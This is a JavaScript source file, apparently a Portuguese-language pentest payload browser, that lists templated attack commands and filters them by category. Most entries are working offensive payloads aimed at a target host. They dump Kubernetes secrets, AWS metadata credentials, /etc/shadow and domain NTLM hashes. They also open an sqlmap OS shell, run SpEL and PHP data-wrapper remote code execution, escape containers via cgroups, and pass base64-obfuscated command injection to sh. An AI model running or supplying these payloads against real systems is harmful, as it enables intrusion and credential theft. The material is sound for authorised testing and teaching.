      purpose: "Verificar se o docker.sock est\u00e1 exposto para comunica\u00e7\u00e3o direta",
      description: "Permite controlar a daemon do Docker via curl ou docker CLI sem autentica\u00e7\u00e3o.",
      code: "ls -la /var/run/docker.sock; curl -s --unix-socket /var/run/docker.sock http://localhost/images/json",
      showUrl: false,
      keywords: "cheat docker socket unix docker.sock privesc"
    },
    {
      id: "cheat-k8s-secrets",
      title: "Kubernetes - Listar Secrets do Cluster",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "kubernetes",
      context: "Kubernetes Security",
      purpose: "Extrair tokens de autentica\u00e7\u00e3o, senhas e certificados em todos os namespaces",
      description: "Coleta secrets em base64 armazenados no cluster Kubernetes.",
      code: "kubectl get secrets -A -o json",
      showUrl: false,
      keywords: "cheat kubernetes k8s secrets tokens credentials"
    },
    {
      id: "cheat-k8s-auth-can-i",
      title: "Kubernetes - Auditoria de Permiss\u00f5es RBAC",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "kubernetes",
      context: "Kubernetes RBAC",
      purpose: "Listar todas as a\u00e7\u00f5es que a conta de servi\u00e7o atual tem permiss\u00e3o de executar",
      description: "Verifica se a ServiceAccount atual tem permiss\u00e3o para criar pods ou listar secrets.",
      code: "kubectl auth can-i --list",
      showUrl: false,
      keywords: "cheat kubernetes k8s rbac auth can-i permissions"
    },
    {
      id: "cheat-aws-sts",
      title: "AWS - Identidade Atual (sts get-caller-identity)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "aws",
      context: "AWS Cloud Security",
      purpose: "Identificar o usu\u00e1rio, ARN e conta AWS da credencial em uso",
      description: "Primeiro comando ap\u00f3s obter chaves AWS (AKIA / ASIA).",
      code: "aws sts get-caller-identity",
      showUrl: false,
      keywords: "cheat aws sts caller identity arn cloud"
    },
    {
      id: "cheat-aws-s3-ls",
      title: "AWS - Listar Buckets S3",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "aws",
      context: "AWS Storage",
      purpose: "Verificar buckets S3 acess\u00edveis na conta",
      description: "Enumera armazenamento de arquivos onde frequentemente residem backups e credenciais.",
      code: "aws s3 ls",
      showUrl: false,
      keywords: "cheat aws s3 ls buckets storage files"
    },
    {
      id: "cheat-aws-metadata",
      title: "AWS - Metadados de Inst\u00e2ncia EC2 (IMDSv1)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "aws",
      context: "AWS SSRF / IMDS",
      purpose: "Extrair credenciais de IAM Role associada \u00e0 m\u00e1quina virtual",
      description: "Endere\u00e7o link-local do servi\u00e7o de metadados em inst\u00e2ncias EC2.",
      code: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      showUrl: false,
      keywords: "cheat aws imds metadata ssrf ec2 credentials"
    },
    {
      id: "cheat-azure-account",
      title: "Azure - Conta Ativa (az account show)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "azure",
      context: "Azure Cloud Security",
      purpose: "Exibir a assinatura e locat\u00e1rio (Tenant) autenticados",
      description: "Verifica informa\u00e7\u00f5es da conta Azure conectada via Azure CLI.",
      code: "az account show -o table",
      showUrl: false,
      keywords: "cheat azure account show subscription tenant"
    },
    {
      id: "cheat-azure-metadata",
      title: "Azure - Metadados de Inst\u00e2ncia VM (IMDS)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "azure",
      context: "Azure SSRF / IMDS",
      purpose: "Consultar metadados e token de Managed Identity em VM Azure",
      description: "Requer o cabe\u00e7alho obrigat\u00f3rio Metadata: true para mitigar SSRF simples.",
      code: "curl -s -H \"Metadata:true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"",
      showUrl: false,
      keywords: "cheat azure imds metadata instance vm ssrf"
    },
    {
      id: "linux-ssh-connect",
      title: "Linux - SSH Conexão com Chave Privada",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "ssh",
      context: "SSH Authentication",
      purpose: "Conectar ao alvo usando chave privada RSA/ED25519",
      description: "Ajusta as permissões da chave privada para 600 e conecta ignorando validação estrita de host.",
      code: "chmod 600 " + file + " && ssh -i " + file + " root@" + ip + " -o StrictHostKeyChecking=no",
      showUrl: false,
      keywords: "linux ssh connect private key chmod 600 id_rsa"
    },
    {
      id: "linux-ssh-authkeys",
      title: "Linux - Checar Authorized Keys",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "ssh",
      context: "SSH Persistence / Enumeration",
      purpose: "Inspecionar chaves públicas autorizadas para login",
      description: "Examina ~/.ssh/authorized_keys e outros arquivos de configuração para descobrir quem tem acesso SSH.",
      code: "cat ~/.ssh/authorized_keys 2>/dev/null; ls -la ~/.ssh/",
      showUrl: false,
      keywords: "linux ssh authorized_keys persistence enum"
    },
    {
      id: "linux-ssh-keygen",
      title: "Linux - Gerar Par de Chaves SSH",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "ssh",
      context: "SSH Key Generation",
      purpose: "Criar chave privada e pública sem senha para persistência",
      description: "Gera um par de chaves RSA de 2048 bits sem passphrase em /tmp/id_rsa.",
      code: "ssh-keygen -t rsa -b 2048 -f /tmp/id_rsa -q -N \"\"",
      showUrl: false,
      keywords: "linux ssh keygen generate rsa 2048"
    },
    {
      id: "linux-scp-download",
      title: "Linux - Download de Arquivo via SCP",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "scp",
      context: "SCP File Transfer",
      purpose: "Baixar arquivo sensível do host remoto via SSH",
      description: "Copia um arquivo da máquina remota para a pasta atual do atacante.",
      code: "scp -i " + file + " root@" + ip + ":/etc/shadow ./shadow.loot",
      showUrl: false,
      keywords: "linux scp download transfer file loot shadow"
    },
    {
      id: "linux-scp-upload",
      title: "Linux - Upload de Ferramenta via SCP",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "scp",
      context: "SCP File Transfer",
      purpose: "Transferir binário ou script para /tmp no host remoto",
      description: "Envia arquivo local (ex: linpeas.sh) para o diretório /tmp da vítima.",
      code: "scp -i " + file + " ./" + file + " root@" + ip + ":/tmp/" + file,
      showUrl: false,
      keywords: "linux scp upload transfer tool bin"
    },
    {
      id: "linux-scp-port",
      title: "Linux - SCP em Porta Customizada (-P)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "scp",
      context: "SCP Custom Port",
      purpose: "Copiar arquivos quando o SSH roda em porta não padrão",
      description: "Usa o parâmetro -P maiúsculo para especificar a porta do daemon SSH.",
      code: "scp -P " + port + " -i " + file + " root@" + ip + ":/path/file ./",
      showUrl: false,
      keywords: "linux scp port custom transfer"
    },
    {
      id: "linux-proxy-socks",
      title: "Linux - SOCKS Proxy Dinâmico (SSH -D)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "proxy",
      context: "Pivoting & SOCKS",
      purpose: "Abrir túnel SOCKS5 local na porta 1080 via SSH",
      description: "Permite usar proxychains ou o navegador para navegar por toda a rede interna do alvo.",
      code: "ssh -D 1080 -N -f -q user@" + ip,
      showUrl: false,
      keywords: "linux proxy socks dynamic ssh 1080 tunnel"
    },
    {
      id: "linux-proxy-sshuttle",
      title: "Linux - VPN Transparente (sshuttle)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "proxy",
      context: "Pivoting & VPN",
      purpose: "Roteamento transparente da subnet interna sem instalar binários no alvo",
      description: "Cria uma VPN sobre SSH encaminhando todo o tráfego da rede \" + pivnet + \".",
      code: "sshuttle -r user@" + ip + " " + pivnet,
      showUrl: false,
      keywords: "linux proxy sshuttle vpn transparent subnet pivot"
    },
    {
      id: "linux-proxy-proxychains",
      title: "Linux - Executar Comando com Proxychains",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "proxy",
      context: "Proxychains Tunneling",
      purpose: "Tunelar varredura ou exploração através do proxy SOCKS",
      description: "Roda comandos TCP através do túnel configurado em /etc/proxychains4.conf.",
      code: "proxychains4 nmap -sT -Pn -p 80,445,3389 " + pivhost,
      showUrl: false,
      keywords: "linux proxy proxychains nmap scan pivot socks"
    },
    {
      id: "sqli-sqlmap-banner",
      title: "sqlmap - Detecção e Banner do DBMS",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "󰆼",
      subcat: "sqlmap",
      context: "Automated SQLi (sqlmap)",
      purpose: "Testar parâmetro vulnerável e extrair banner do banco",
      description: "Executa sqlmap em modo não interativo (--batch) contra o alvo.",
      code: "sqlmap -u \\\"http://" + ip + ":" + port + "/?id=1\\\" --batch --banner",
      showUrl: false,
      keywords: "sqli sqlmap automated banner test detect"
    },
    {
      id: "sqli-sqlmap-dbs",
      title: "sqlmap - Listar Todos os Bancos de Dados",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "󰆼",
      subcat: "sqlmap",
      context: "Automated SQLi (sqlmap)",
      purpose: "Enumerar esquemas e bancos existentes",
      description: "Coleta a lista completa de bases de dados acessíveis.",
      code: "sqlmap -u \\\"http://" + ip + ":" + port + "/?id=1\\\" --batch --dbs",
      showUrl: false,
      keywords: "sqli sqlmap dbs enum databases"
    },
    {
      id: "sqli-sqlmap-tables",
      title: "sqlmap - Listar Tabelas de um Banco",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "󰆼",
      subcat: "sqlmap",
      context: "Automated SQLi (sqlmap)",
      purpose: "Listar tabelas de uma base específica",
      description: "Filtra pelo banco especificado e extrai todas as tabelas.",
      code: "sqlmap -u \\\"http://" + ip + ":" + port + "/?id=1\\\" --batch -D dbname --tables",
      showUrl: false,
      keywords: "sqli sqlmap tables enum database"
    },
    {
      id: "sqli-sqlmap-dump",
      title: "sqlmap - Dump de Tabela de Usuários",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "󰆼",
      subcat: "sqlmap",
      context: "Automated SQLi (sqlmap)",
      purpose: "Baixar registros e quebrar hashes de senha de uma tabela",
      description: "Despeja todo o conteúdo da tabela users incluindo hashes de senha.",
      code: "sqlmap -u \\\"http://" + ip + ":" + port + "/?id=1\\\" --batch -D dbname -T users --dump",
      showUrl: false,
      keywords: "sqli sqlmap dump users passwords hashes"
    },
    {
      id: "sqli-sqlmap-osshell",
      title: "sqlmap - OS Shell Interativo (--os-shell)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "󰆼",
      subcat: "sqlmap",
      context: "Automated SQLi to RCE",
      purpose: "Fazer upload de backdoor SQL para obter shell do sistema operacional",
      description: "Utiliza injeção para subir um stager de comando no servidor web ou banco.",
      code: "sqlmap -r req.txt --batch --os-shell",
      showUrl: false,
      keywords: "sqli sqlmap os-shell rce command upload"
    },
    {
      id: "cheat-win-unquoted",
      title: "Windows - Unquoted Service Paths",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "windows",
      context: "Windows Privilege Escalation",
      purpose: "Localizar serviços com caminhos não entre aspas que permitam binário falso",
      description: "Procura serviços configurados como Auto que não usam aspas em caminhos com espaços.",
      code: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\" | findstr /i /v \"\"\"",
      showUrl: false,
      keywords: "cheat windows unquoted service paths privesc"
    },
    {
      id: "cheat-win-always-elevated",
      title: "Windows - AlwaysInstallElevated Check",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "windows",
      context: "Windows Privilege Escalation",
      purpose: "Verificar se instaladores MSI rodam como NT AUTHORITY\\SYSTEM",
      description: "Se ambas as chaves de registro forem 0x1, um pacote .msi malicioso garante root/SYSTEM.",
      code: "reg query HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated; reg query HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated",
      showUrl: false,
      keywords: "cheat windows alwaysinstallelevated registry msi privesc"
    },
    {
      id: "cheat-ad-bloodhound",
      title: "Active Directory - Coleta Rápida BloodHound",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "ad",
      context: "Active Directory Graph Analysis",
      purpose: "Coletar todo o grafo de permissões, sessões e ACLs do domínio",
      description: "Gera arquivo ZIP para importação direta na interface do BloodHound.",
      code: "bloodhound-python -d " + domain + " -u " + user + " -p \x27PASS\x27 -gc " + dc + " -c All --zip",
      showUrl: false,
      keywords: "cheat ad bloodhound graph acl sessions domain"
    },
    {
      id: "cheat-ad-secretsdump",
      title: "Active Directory - Dump de NTLM Hashes (DCSync)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "ad",
      context: "Active Directory Credential Dumping",
      purpose: "Extrair hashes NTLM de todos os usuários do domínio via protocolo DRSR",
      description: "Requer privilégios de DCSync (membro de Domain Admins ou direitos de replicação).",
      code: "impacket-secretsdump -just-dc-ntlm " + domain + "/" + user + "@" + dc,
      showUrl: false,
      keywords: "cheat ad secretsdump dcsync hashes ntlm"
    },
    {
      id: "cheat-web-feroxbuster",
      title: "Web - Fuzzing de Rotas com Feroxbuster",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "web",
      context: "Web Discovery",
      purpose: "Descoberta rápida e recursiva de diretórios em Rust",
      description: "Ferramenta de alta concorrência com auto-tune de requisições.",
      code: "feroxbuster -u http://" + ip + ":" + port + " -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30",
      showUrl: false,
      keywords: "cheat web feroxbuster directories wordlist discovery"
    },
    {
      id: "cheat-web-api-enum",
      title: "Web - Enumeração de Endpoints de API",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "web",
      context: "REST API Discovery",
      purpose: "Identificar rotas RESTful e endpoints GraphQL",
      description: "Fuzzing focado em endpoints comuns de APIs modernas.",
      code: "ffuf -u http://" + ip + ":" + port + "/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints.txt -mc 200,201,401,403",
      showUrl: false,
      keywords: "cheat web api endpoints graphql rest ffuf"
    },
    {
      id: "cheat-docker-priv-cgroup",
      title: "Docker - Escape via Privileged Cgroup v1",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "docker",
      context: "Container Breakout",
      purpose: "Executar comando no host a partir de container privileged",
      description: "Utiliza a feature release_agent do cgroup para disparar script no host pai.",
      code: "mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x",
      showUrl: false,
      keywords: "cheat docker privileged cgroup escape breakout"
    },
    {
      id: "cheat-k8s-token",
      title: "Kubernetes - Leitura de Token de ServiceAccount",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "kubernetes",
      context: "Kubernetes Token Extraction",
      purpose: "Extrair o token JWT montado dentro do pod",
      description: "Lê o token que permite autenticação contra a API do Kubernetes.",
      code: "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
      showUrl: false,
      keywords: "cheat kubernetes token serviceaccount jwt pod"
    },
    {
      id: "cheat-aws-s3-sync",
      title: "AWS - Download Completo de Bucket S3",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "aws",
      context: "AWS Cloud Storage",
      purpose: "Sincronizar e baixar todos os arquivos de um bucket S3",
      description: "Copia recursivamente arquivos do bucket para diretório local.",
      code: "aws s3 sync s3://target-bucket ./s3_loot/",
      showUrl: false,
      keywords: "cheat aws s3 sync bucket download files"
    },
    {
      id: "cheat-azure-group",
      title: "Azure - Listar Resource Groups",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "azure",
      context: "Azure Cloud Enumeration",
      purpose: "Mapear grupos de recursos e regiões onde a organização opera",
      description: "Lista todos os resource groups da assinatura ativa.",
      code: "az group list -o table",
      showUrl: false,
      keywords: "cheat azure resource groups enum table"
    },
    {
      id: "web-hdr-cors",
      title: "Web - Teste de CORS Origin Reflection",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "headers",
      context: "CORS Misconfiguration",
      purpose: "Verificar se a aplicação reflete cabeçalho Origin arbitrário",
      description: "Se Access-Control-Allow-Origin refletir evil.com com Allow-Credentials: true, há roubo de dados.",
      code: "curl -H \"Origin: https://evil.com\" -I -s http://" + ip + ":" + port + "/",
      showUrl: false,
      keywords: "web headers cors origin reflection credentials"
    },
    {
      id: "web-hdr-cookie-flags",
      title: "Web - Auditoria de Flags em Set-Cookie",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "headers",
      context: "Session Security",
      purpose: "Verificar presença de flags HttpOnly, Secure e SameSite nos cookies",
      description: "Cookies sem HttpOnly podem ser lidos via XSS; sem Secure podem vazar em HTTP puro.",
      code: "curl -I -s http://" + ip + ":" + port + "/ | grep -i \"Set-Cookie\"",
      showUrl: false,
      keywords: "web headers cookies httponly secure samesite flags"
    },
    {
      id: "web-ssti-spel",
      title: "Web - SSTI Spring Expression Language (SpEL)",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "ssti",
      context: "Java Spring Boot SSTI",
      purpose: "Executar comandos do sistema operacional em aplicações Spring",
      description: "Avalia expressões SpEL invocando Runtime.getRuntime().exec() para RCE.",
      code: "${T(java.lang.Runtime).getRuntime().exec('id')}",
      showUrl: true,
      keywords: "web ssti spel java spring boot runtime exec"
    },
    {
      id: "web-rfi-data",
      title: "Web - RFI via PHP Data Wrapper",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "rfi",
      context: "PHP Stream Wrappers",
      purpose: "Injetar código PHP inline em base64 sem hospedar servidor remoto",
      description: "Usa o wrapper data:// para passar payload <?php system($_GET['c']); ?> diretamente na URL.",
      code: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
      showUrl: true,
      keywords: "web rfi data wrapper php base64 inline rce"
    },
    {
      id: "web-traversal-nginx",
      title: "Web - Path Traversal (Nginx Off-by-Slash)",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "traversal",
      context: "Nginx Alias Misconfiguration",
      purpose: "Retroceder pasta raiz de alias em servidores Nginx configurados sem barra final",
      description: "Explora configuração 'location /static { alias /var/www/static/; }' permitindo ler /static../app.py.",
      code: "/static../settings.py",
      showUrl: true,
      keywords: "web traversal nginx off by slash alias"
    },
    {
      id: "web-traversal-win",
      title: "Web - Path Traversal (Windows Hosts)",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "traversal",
      context: "Windows File Traversal",
      purpose: "Ler o arquivo de hosts do Windows para confirmar a vulnerabilidade",
      description: "Usa contra-barras duplas para navegar até C:\\Windows\\System32\\drivers\\etc\\hosts.",
      code: "..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
      showUrl: true,
      keywords: "web traversal windows hosts drivers etc path"
    },
    {
      id: "web-cmdi-ifs",
      title: "Web - Command Injection (Bypass de Espaço ${IFS})",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "cmdi",
      context: "WAF / Filter Bypass",
      purpose: "Executar comandos quando a aplicação bloqueia espaços ou quebras de linha",
      description: "Usa a variável interna do shell IFS (Internal Field Separator) como substituto de espaço.",
      code: "cat\\${IFS}/etc/passwd",
      showUrl: true,
      keywords: "web cmdi bypass ifs space filter waf"
    },
    {
      id: "web-cmdi-b64-pipe",
      title: "Web - Command Injection (Base64 Pipe Decode)",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "cmdi",
      context: "WAF Bypass / Obfuscation",
      purpose: "Executar comandos arbitrários ofuscados para escapar de filtros de caracteres especiais",
      description: "Decodifica string base64 em runtime e passa direto para o shell sh.",
      code: "echo\\${IFS}Y2F0IC9ldGMvcGFzc3dk|base64\\${IFS}-d|sh",
      showUrl: true,
      keywords: "web cmdi base64 pipe decode bypass waf sh"
    }
  ], lang);
}

function getLinuxPayloads(subcat, ip, port, file, domain, user, dc, pivnet, pivhost, lang) {
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost, lang);
  return all.filter(function(item) {
    if (item.category !== "linux") return false;
    if (!subcat || subcat === "all") return true;
    if (subcat === "ssh") return item.subcat === "ssh" || item.subcat === "ssh_scp";
    if (subcat === "scp") return item.subcat === "scp" || item.subcat === "ssh_scp";
    if (subcat === "capabilities" || subcat === "cap") return item.subcat === "capabilities" || item.subcat === "cap";
    return item.subcat === subcat;
  });
}

function getSqliPayloads(subcat, ip, port, file, domain, user, dc, pivnet, pivhost, lang) {
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost, lang);
  return all.filter(function(item) {
    if (item.category !== "sqli") return false;
    if (!subcat || subcat === "all") return true;
    return item.subcat === subcat;
  });
}

function getWebPayloads(subcat, ip, port, file, domain, user, dc, pivnet, pivhost, lang) {
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost, lang);
  return all.filter(function(item) {
    if (item.category !== "web" && item.category !== "xss" && item.category !== "lfi") return false;
    if (!subcat || subcat === "all") return true;
    if (subcat === "xss") return item.category === "xss" || item.subcat === "xss";
    if (subcat === "lfi") return item.category === "lfi" || item.subcat === "lfi";
    if (subcat === "traversal") return item.subcat === "traversal";
    return item.subcat === subcat;
  });
}

function getCheatsheets(subcat, ip, port, file, domain, user, dc, pivnet, pivhost, lang) {
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost, lang);
  return all.filter(function(item) {
    if (item.category !== "cheats") return false;
    if (!subcat || subcat === "all") return true;
    return item.subcat === subcat;
  });
}

function getFavorites(favList, ip, port, file, domain, user, dc, pivnet, pivhost, lang) {
  if (!favList || !favList.length) return [];
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost, lang);
  return all.filter(function(item) {
    return favList.indexOf(String(item.code)) >= 0;
  });
}

function searchPayloads(query, ip, port, file, domain, user, dc, pivnet, pivhost, lang) {
  var q = String(query || "").trim().toLowerCase();
  if (!q) return [];
  var terms = q.split(/\s+/);
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost, lang);
  return all.filter(function(item) {
    var haystack = (item.title + " " + item.category + " " + item.categoryLabel + " " + item.subcat + " " + item.context + " " + item.purpose + " " + item.description + " " + item.keywords).toLowerCase();
    for (var i = 0; i < terms.length; i++) {
      if (haystack.indexOf(terms[i]) === -1) return false;
    }
    return true;
  });
}
